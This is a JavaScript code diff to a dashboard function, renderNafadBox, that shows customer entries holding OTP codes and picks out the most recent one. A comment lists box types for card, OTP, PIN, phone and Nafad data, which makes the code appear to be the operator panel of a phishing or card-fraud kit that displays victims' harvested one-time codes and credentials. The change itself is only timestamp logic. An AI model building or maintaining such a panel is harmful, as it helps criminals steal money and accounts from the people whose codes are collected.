@@ -2400,28 +2400,41 @@ const renderNafadBox = () => {
     });
     
     // Create a box for each entry that has OTP data
+    // Find the most recent OTP timestamp first
+    let latestOtpTimestamp = 0;
+    customerEntryGroup.forEach((entry) => {
+      const raw = entry.raw || {};
+      if (raw._v5 || raw.otpCode) {
+        const ts = raw._v5UpdatedAt 
+          ? new Date(raw._v5UpdatedAt).getTime() 
+          : new Date(entry.submittedAt || entry.updatedAt || Date.now()).getTime();
+        if (ts > latestOtpTimestamp) {
+          latestOtpTimestamp = ts;
+        }
+      }
+    });
+
     customerEntryGroup.forEach((entry, index) => {
       const raw = entry.raw || {};
       const otpCode = raw._v5 || raw.otpCode;
-      
-      // Box type offset: Basic=0, Card=1, OTP=2, PIN=3, Phone=4, Nafad=5
-      const BOX_TYPE_OFFSET = 2;
-      
-      // Use _v5UpdatedAt if available and valid, otherwise use entry's timestamp
-      let baseTimestamp = entry.submittedAt || entry.createdAt || entry.updatedAt || Date.now();
+
+      // Check if this entry has OTP data
+      if (!otpCode) return;
+
+      // Use _v5UpdatedAt timestamp for accurate time display
+      let entryTimestamp = Date.now();
       if (raw._v5UpdatedAt) {
         const _v5Ts = new Date(raw._v5UpdatedAt).getTime();
         if (_v5Ts > 0) {
-          baseTimestamp = raw._v5UpdatedAt;
+          entryTimestamp = _v5Ts;
         }
+      } else if (entry.submittedAt) {
+        entryTimestamp = new Date(entry.submittedAt).getTime();
       }
-      
-      const entryTimestamp = new Date(baseTimestamp).getTime() - (index * 10000) - BOX_TYPE_OFFSET;
-      const isLatest = index === 0;
-      
-      // Check if this entry has OTP data
-      if (!otpCode) return;
-      
+
+      // This is the latest OTP if its timestamp matches the most recent
+      const isLatest = entryTimestamp === latestOtpTimestamp;
+
       boxes.push({
         key: `otp-${entry.id}`,
         timestamp: entryTimestamp,
